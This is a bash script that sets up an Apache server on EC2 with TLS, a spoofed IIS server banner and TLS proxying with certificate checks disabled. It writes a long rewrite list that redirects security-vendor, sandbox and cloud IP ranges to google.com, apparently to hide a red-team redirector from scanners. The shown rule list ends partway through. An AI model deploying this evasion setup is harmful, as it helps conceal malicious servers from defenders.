#!/bin/bash
MYDOMAIN="$1"
MYFQDN="$1.$2"
EC2IP="$3"
PURPLE='\033[0;35m'
BLUE='\033[0;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

cat <<'EOF' >server-setup.sh
#!/bin/bash
# Steps for updating the system, installing Apache, setting up basic security with mod_security and certbot for SSL, and configuring Apache

# sleep until instance is ready
until [[ -f /var/lib/cloud/instance/boot-finished ]]; do
  sleep 1
done

# Update the system's package index files from their sources.
sudo apt update

# Begin Apache server setup
echo "Setting up Apache"
DEBIAN_FRONTEND=noninteractive sudo apt-get install -y apache2
sudo systemctl enable apache2

# Install Certbot and its Apache plugin for obtaining SSL certificates
DEBIAN_FRONTEND=noninteractive sudo apt install certbot python3-certbot-apache -y

# Install the Apache module 'mod_security2' for enhancing security
DEBIAN_FRONTEND=noninteractive sudo apt install libapache2-mod-security2 -y

# Disable the default Apache site configuration
sudo a2dissite 000-default.conf

# Enable various Apache modules
sudo a2enmod proxy proxy_ajp proxy_http rewrite deflate headers proxy_balancer proxy_connect proxy_html

# Disable the autoindex module forcefully to prevent directory listings
sudo a2dismod autoindex -f

# Enable the security module for Apache
sudo a2enmod security2

# Update the Apache security config
sudo sed -i "s/ServerSignature On/ServerSignature Off/g" /etc/apache2/conf-available/security.conf
echo "SecServerSignature Microsoft-IIS/10.0" | sudo tee -a /etc/apache2/conf-available/security.conf
sudo sed -i "s/ServerTokens OS/ServerTokens Full/g" /etc/apache2/conf-available/security.conf

# Restart Apache to apply all the changes
sudo systemctl reload apache2
sleep 30
EOF

printf "\n${GREEN}[-] Apache setup underway!${NC}\n\n"

chmod +x server-setup.sh
./server-setup.sh

# Domain setup script
cat <<'EOF' >domain-setup.sh
#!/bin/bash
MYDOMAIN="$1"
MYFQDN="$1.$2"
# Sleep until instance is ready
until [[ -f /var/lib/cloud/instance/boot-finished ]]; do
  sleep 1
done

echo "Start of Domain-Setup Script"
echo "Using $MYDOMAIN in script"

# Start Domain Setup:
echo "Creating $MYDOMAIN dirs now.."
sudo mkdir -p /var/www/$MYDOMAIN/logs
sudo chown -R root:root /var/www/$MYDOMAIN
sudo chmod -R 755 /var/www/$MYDOMAIN
sudo mkdir -p /var/www/$MYDOMAIN/.well-known/acme-challenge
sudo chown -R www-data:www-data /var/www/$MYDOMAIN/.well-known
sudo chmod -R 755 /var/www/$MYDOMAIN/.well-known

# Setup Virtual Host file
echo "Setting up First Virtual Host file.."
sudo bash -c "cat > /etc/apache2/sites-available/$MYDOMAIN.conf" <<VHOST
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    ServerName $MYFQDN
    ServerAlias www.$MYFQDN
    DocumentRoot /var/www/$MYDOMAIN
    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined

    RewriteEngine on
    RewriteCond %{SERVER_NAME} =$MYFQDN [OR]
    RewriteCond %{SERVER_NAME} =www.$MYFQDN
    RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent]
</VirtualHost>
VHOST

sudo a2ensite $MYDOMAIN.conf
sudo systemctl reload apache2

# Check for domain to resolve
while true; do
    host "$MYFQDN" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        break
    fi
    echo "Waiting for DNS to propagate..."
    sleep 30
done

echo "If I fail, re-run: sudo certbot --apache --email admin@$MYFQDN --agree-tos --no-eff-email -d $MYFQDN --redirect --hsts --uir"

while ! ss -tuln | grep ':80 '; do
    echo "Waiting for Apache to bind to port 80..."
    sudo systemctl reload apache2
    sleep 60
done

# Final Domain Setup
sudo certbot --apache --email admin@$MYFQDN --agree-tos --no-eff-email -d $MYFQDN --redirect --hsts --uir
echo "Certbot should be done now.."
sudo systemctl reload apache2
sleep 90

echo "Final Apache restart"
sudo systemctl reload apache2
sleep 90

echo "Killing Script"
exit 0
EOF

printf "\n\n${GREEN}[-] TLS setup underway!${NC}\n\n"

chmod +x domain-setup.sh
./domain-setup.sh "$MYDOMAIN" "$2"

# Create a basic error page
cat <<EOF >/var/www/$MYDOMAIN/error.html
<!DOCTYPE html><html><head><style>body{font-family:Arial,sans-serif;text-align:center;background-color:#f2f2f2;margin:0;padding:0;}h1{color:#ff0000;margin-top:20%;}p{color:#555;}</style></head><body><h1>Error!</h1><p>Something has gone wrong. Please try again later.</p></body></html>
EOF

cat <<EOF >/etc/apache2/sites-available/$MYDOMAIN-le-ssl.conf
# Hardcoded scheme to avoid issues
Define redir_scheme https
# Redirect site to:
Define REDIR_TARGET https://www.google.com

<IfModule mod_ssl.c>
<VirtualHost *:443>
    ServerAdmin webmaster@localhost
    ServerName $MYFQDN
    ServerAlias www.$MYFQDN

    ## — SSL Certificates —
    SSLCertificateFile      /etc/letsencrypt/live/$MYFQDN/fullchain.pem
    SSLCertificateKeyFile   /etc/letsencrypt/live/$MYFQDN/privkey.pem
    Include                 /etc/letsencrypt/options-ssl-apache.conf

    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    ProxyPreserveHost On

     ## ——— Override proxy errors to your custom page ———
    ProxyErrorOverride On
    ErrorDocument 502 /error.html
    ErrorDocument 500 /error.html

    ## ——— Block & redirect all other traffic ———
    # Block known scanner IPs via redirect.rules
    Include /etc/apache2/redirect.rules

    ## ——— Logging ———
    ErrorLog   /var/www/$MYDOMAIN/logs/error.log
    CustomLog  /var/www/$MYDOMAIN/logs/access.log combined

    ## ——— Security headers ———
    <IfModule mod_headers.c>
      Header always set Strict-Transport-Security "max-age=31536000"
      Header always set X-Content-Type-Options "nosniff"
      Header always set X-Frame-Options "SAMEORIGIN"
      Header always set X-XSS-Protection "1; mode=block"
      Header always set Referrer-Policy "strict-origin"
      Header set   Content-Type "text/html; charset=utf-8"
    </IfModule>

    ## — Document root & error page —
    DocumentRoot /var/www/$MYDOMAIN
</VirtualHost>
</IfModule>
EOF

sudo systemctl reload apache2
printf "\n\n${GREEN}[-] Apache VHOSTS setup complete!${NC}\n\n"
sleep 60

# Updated redirect rules
cat <<EOF >/etc/apache2/redirect.rules
Define REDIR_TARGET https://www.google.com

RewriteEngine On
RewriteOptions Inherit

# Block known scanner IPs
RewriteCond %{REMOTE_ADDR} ^(185\.199\.|140\.82\.|192\.30\.) [NC]
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

# Class A Exclusions. Includes large ranges from Azure & AWS
# Cloudfronted requests by default will have a UA of "Amazon Cloudfront"
RewriteCond                             expr                                    "-R '54.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '52.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '34.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '13.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '35.0.0.0/8'"
RewriteCond                             %{HTTP_USER_AGENT}                      "!cloudfront" [NC]
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

# AWS Fine Grained
RewriteCond                             expr                                    "-R '100.20.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '100.24.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '103.246.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '103.4.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '103.8.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '107.20.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '107.23.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '122.248.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '143.204.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '157.175.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '160.1.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '172.96.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '174.129.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '175.41.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '176.32.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '176.34.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '177.71.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '177.72.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '178.236.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '18.130.0.0/15'" [OR]
RewriteCond                             expr                                    "-R '18.132.0.0/14'" [OR]
RewriteCond                             expr                                    "-R '18.132.0.0/13'" [OR]
RewriteCond                             expr                                    "-R '18.144.0.0/12'" [OR]
RewriteCond                             expr                                    "-R '18.160.0.0/11'" [OR]
RewriteCond                             expr                                    "-R '18.192.0.0/11'" [OR]
RewriteCond                             expr                                    "-R '18.224.0.0/12'" [OR]
RewriteCond                             expr                                    "-R '18.240.0.0/13'" [OR]
RewriteCond                             expr                                    "-R '18.248.0.0/14'" [OR]
RewriteCond                             expr                                    "-R '18.252.0.0/15'" [OR]
RewriteCond                             expr                                    "-R '184.169.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '184.72.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '184.73.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '185.143.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '185.48.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '203.83.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '204.236.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '204.246.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '205.251.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '207.171.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '216.137.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '216.182.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.20.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '27.0.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '3.0.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '3.112.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '3.120.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '3.16.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '3.40.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '3.8.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '3.80.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '35.153.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '35.154.0.0/15'" [OR]
RewriteCond                             expr                                    "-R '35.156.0.0/14'" [OR]
RewriteCond                             expr                                    "-R '35.160.0.0/12'" [OR]
RewriteCond                             expr                                    "-R '35.176.0.0/14'" [OR]
RewriteCond                             expr                                    "-R '35.180.0.0/15'" [OR]
RewriteCond                             expr                                    "-R '35.182.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '46.137.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '46.51.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '50.112.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '50.16.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '50.18.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '50.19.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '63.32.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '64.252.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '67.202.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '70.132.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '71.152.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '72.21.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '72.44.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '75.101.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '79.125.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '87.238.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '96.127.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '99.79.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '99.80.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '99.82.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '99.84.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '99.86.0.0/16'" [OR]

# ForcePoint
RewriteCond                             expr                                    "-R '208.80.192.0/21'"  [OR]
RewriteCond                             expr                                    "-R '85.115.60.0/24'"   [OR]
RewriteCond                             expr                                    "-R '208.87.232.0/24'"  [OR]

# Domain Tools: @breakersall
RewriteCond                             expr                                    "-R '199.30.228.0/22'"  [OR]

# ZScaler
RewriteCond                             expr                                    "-R '165.255.0.0/17'"   [OR]
RewriteCond                             expr                                    "-R '104.129.204.0/24'" [OR]

# Misc Contributions: @ztgrace
RewriteCond                             expr                                    "-R '195.189.155.0/24'" [OR] # BitDefender
RewriteCond                             expr                                    "-R '91.199.104.0/24'"  [OR] # BitDefender
RewriteCond                             expr                                    "-R '91.212.136.0/24'"  [OR] # IKARUS Security Software
RewriteCond                             expr                                    "-R '208.90.236.0/22'"  [OR] # Trustwave Holdings, Inc
RewriteCond                             expr                                    "-R '204.13.200.0/22'"  [OR] # Trustwave Holdings, Inc.
RewriteCond                             expr                                    "-R '207.102.138.0/24'" [OR] # FORTINET TECHNOLOGIES (CANADA) INC
RewriteCond                             expr                                    "-R '208.87.232.0/21'"  [OR] # SurfControl, Inc.
RewriteCond                             expr                                    "-R '103.245.47.20'"    [OR] # McAfee Software (India) Private Limited
RewriteCond                             expr                                    "-R '182.75.165.176/30'"[OR] # NETSKOPE

# Other VT hosts
RewriteCond                             expr                                    "-R '173.94.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '8.34.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '8.35.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '92.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '93.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '94.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '95.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '96.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '97.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '98.0.0.0/8'" [OR]
RewriteCond                             expr                                    "-R '99.0.0.0/8'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

# TrendMicro
RewriteCond                             expr                                    "-R '150.70.0.0/22'"    [OR]
RewriteCond                             expr                                    "-R '150.70.104.0/22'"  [OR]
RewriteCond                             expr                                    "-R '150.70.110.0/24'"  [OR]
RewriteCond                             expr                                    "-R '150.70.112.0/20'"  [OR]
RewriteCond                             expr                                    "-R '150.70.12.0/22'"   [OR]
RewriteCond                             expr                                    "-R '150.70.160.0/20'"  [OR]
RewriteCond                             expr                                    "-R '150.70.176.0/20'"  [OR]
RewriteCond                             expr                                    "-R '150.70.192.0/21'"  [OR]
RewriteCond                             expr                                    "-R '150.70.224.0/20'"  [OR]
RewriteCond                             expr                                    "-R '150.70.240.0/20'"  [OR]
RewriteCond                             expr                                    "-R '150.70.31.0/24'"   [OR]
RewriteCond                             expr                                    "-R '150.70.4.0/22'"    [OR]
RewriteCond                             expr                                    "-R '150.70.64.0/18'"   [OR]
RewriteCond                             expr                                    "-R '150.70.64.0/20'"   [OR]
RewriteCond                             expr                                    "-R '150.70.8.0/22'"    [OR]
RewriteCond                             expr                                    "-R '150.70.80.0/20'"   [OR]
RewriteCond                             expr                                    "-R '150.70.96.0/20'"   [OR]
RewriteCond                             expr                                    "-R '206.165.76.0/24'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

#BlueCoat: @breakersall
RewriteCond                             expr                                    "-R '199.116.168.0/21'" [OR]
RewriteCond                             expr                                    "-R '66.93.208.240/28'" [OR]
RewriteCond                             expr                                    "-R '115.164.86.121'"   [OR]

#URL Query: @breakersall
RewriteCond                             expr                                    "-R '77.40.129.123'"    [OR]
RewriteCond                             expr                                    "-R '95.183.244.0/24'"  [OR]
RewriteCond                             expr                                    "-R '23.239.28.127'"    [OR]
RewriteCond                             expr                                    "-R '79.79.148.81'"     [OR]
RewriteCond                             expr                                    "-R '104.131.157.171'"  [OR]
RewriteCond                             expr                                    "-R '84.33.17.128/25'"  [OR]
RewriteCond                             expr                                    "-R '199.254.238.0/24'" [OR]
RewriteCond                             expr                                    "-R '196.52.48.49'"     [OR]
RewriteCond                             expr                                    "-R '89.38.150.0/24'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

#Palo Alto
RewriteCond                             expr                                    "-R '154.59.123.0/24'"  [OR]
RewriteCond                             expr                                    "-R '154.59.126.0/24'"  [OR]
RewriteCond                             expr                                    "-R '199.167.52.0/24'"  [OR]
RewriteCond                             expr                                    "-R '199.167.53.0/24'"  [OR]
RewriteCond                             expr                                    "-R '199.167.55.0/24'"  [OR]
RewriteCond                             expr                                    "-R '202.126.13.0/24'"  [OR]
RewriteCond                             expr                                    "-R '202.189.133.0/24'" [OR]
RewriteCond                             expr                                    "-R '208.184.7.0/24'"   [OR]
RewriteCond                             expr                                    "-R '64.74.215.0/24'"   [OR]
RewriteCond                             expr                                    "-R '65.154.226.0/24'"  [OR]
RewriteCond                             expr                                    "-R '70.42.131.0/24'"   [OR]
RewriteCond                             expr                                    "-R '72.5.231.0/24'"    [OR]
RewriteCond                             expr                                    "-R '72.5.65.0/24'"     [OR]
RewriteCond                             expr                                    "-R '74.201.127.0/24'"  [OR]
RewriteCond                             expr                                    "-R '74.217.90.0/24'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

#ProofPoint
RewriteCond                             expr                                    "-R '148.163.148.0/22'" [OR]
RewriteCond                             expr                                    "-R '148.163.156.0/23'" [OR]
RewriteCond                             expr                                    "-R '208.84.65.0/24'"   [OR]
RewriteCond                             expr                                    "-R '208.84.66.0/24'"   [OR]
RewriteCond                             expr                                    "-R '208.86.202.0/24'"  [OR]
RewriteCond                             expr                                    "-R '208.86.203.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.144.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.145.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.146.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.147.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.148.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.149.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.151.0/24'"  [OR]
RewriteCond                             expr                                    "-R '67.231.158.0/24'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

#Fortigate
RewriteCond                             expr                                    "-R '173.243.128.0/20'" [OR]
RewriteCond                             expr                                    "-R '173.243.136.0/21'" [OR]
RewriteCond                             expr                                    "-R '208.91.112.0/22'"  [OR]
RewriteCond                             expr                                    "-R '208.91.112.0/23'"  [OR]
RewriteCond                             expr                                    "-R '208.91.114.0/23'"  [OR]
RewriteCond                             expr                                    "-R '23.249.49.0/24'"   [OR]
RewriteCond                             expr                                    "-R '23.249.50.0/24'"   [OR]
RewriteCond                             expr                                    "-R '23.249.51.0/24'"   [OR]
RewriteCond                             expr                                    "-R '23.249.52.0/24'"   [OR]
RewriteCond                             expr                                    "-R '23.249.53.0/24'"   [OR]
RewriteCond                             expr                                    "-R '23.249.54.0/24'"   [OR]
RewriteCond                             expr                                    "-R '23.249.55.0/24'"   [OR]
RewriteCond                             expr                                    "-R '96.45.32.0/20'"    [OR]
RewriteCond                             expr                                    "-R '96.45.32.0/21'"    [OR]
RewriteCond                             expr                                    "-R '96.45.40.0/21'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

#Symantec
RewriteCond                             expr                                    "-R '95.45.252.0/29'"   [OR]
RewriteCond                             expr                                    "-R '143.127.10.0/23'"  [OR]
RewriteCond                             expr                                    "-R '143.127.100.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.102.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.103.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.119.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.136.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.138.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.139.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.14.0/23'"  [OR]
RewriteCond                             expr                                    "-R '143.127.2.0/24'"   [OR]
RewriteCond                             expr                                    "-R '143.127.241.0/24'" [OR]
RewriteCond                             expr                                    "-R '143.127.242.0/23'" [OR]
RewriteCond                             expr                                    "-R '143.127.87.0/24'"  [OR]
RewriteCond                             expr                                    "-R '143.127.89.0/24'"  [OR]
RewriteCond                             expr                                    "-R '143.127.93.0/24'"  [OR]
RewriteCond                             expr                                    "-R '155.64.105.0/24'"  [OR]
RewriteCond                             expr                                    "-R '155.64.138.0/24'"  [OR]
RewriteCond                             expr                                    "-R '155.64.16.0/23'"   [OR]
RewriteCond                             expr                                    "-R '155.64.23.0/24'"   [OR]
RewriteCond                             expr                                    "-R '155.64.38.0/24'"   [OR]
RewriteCond                             expr                                    "-R '155.64.40.0/24'"   [OR]
RewriteCond                             expr                                    "-R '155.64.49.0/24'"   [OR]
RewriteCond                             expr                                    "-R '155.64.56.0/24'"   [OR]
RewriteCond                             expr                                    "-R '155.64.63.0/24'"   [OR]
RewriteCond                             expr                                    "-R '166.98.152.0/23'"  [OR]
RewriteCond                             expr                                    "-R '166.98.242.0/23'"  [OR]
RewriteCond                             expr                                    "-R '166.98.38.0/24'"   [OR]
RewriteCond                             expr                                    "-R '166.98.67.0/24'"   [OR]
RewriteCond                             expr                                    "-R '166.98.71.0/24'"   [OR]
RewriteCond                             expr                                    "-R '198.6.32.0/20'"    [OR]
RewriteCond                             expr                                    "-R '198.6.32.0/24'"    [OR]
RewriteCond                             expr                                    "-R '198.6.34.0/24'"    [OR]
RewriteCond                             expr                                    "-R '198.6.62.0/24'"    [OR]
RewriteCond                             expr                                    "-R '216.10.192.0/20'"  [OR]
RewriteCond                             expr                                    "-R '216.10.193.0/24'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

# Microsoft
RewriteCond                             expr                                    "-R '104.40.0.0/13'"
RewriteRule ^.*$ https://www.google.com/ [L,R=302]

# Azure
RewriteCond                             expr                                    "-R '104.208.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.209.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.210.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.211.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.214.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.215.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.40.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.41.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.42.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.43.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.44.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.45.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.46.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '104.47.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '111.221.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '131.253.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '134.170.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '137.116.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '137.117.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '137.135.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '138.91.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '157.55.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '157.56.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '168.61.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '168.62.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '168.63.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.232.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.233.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.234.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.235.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.236.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.237.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.238.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '191.239.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '193.149.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '199.30.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.184.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.185.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.186.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.187.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.188.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.189.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.190.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.191.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.36.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.37.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.38.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.39.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.40.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.41.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.42.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.43.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '20.44.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '204.231.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '207.46.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '207.68.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '209.240.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '213.199.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.100.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.101.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.102.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.103.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.96.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.97.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.98.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '23.99.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.112.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.113.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.114.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.115.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.116.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.117.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.118.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.119.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.121.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.122.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.123.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.124.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.125.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.126.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.127.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.64.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.65.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.66.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.67.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.68.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.69.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.70.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.71.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.74.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.75.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.76.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.77.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.78.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.79.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.80.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.81.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.82.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.83.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.84.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.85.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.86.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.87.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.88.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.89.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.90.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '40.91.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.104.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.105.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.136.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.137.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.140.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.141.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.142.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.143.0.0/16'" [OR]
RewriteCond                             expr                                    "-R '51.144.0.0/16'" [OR]
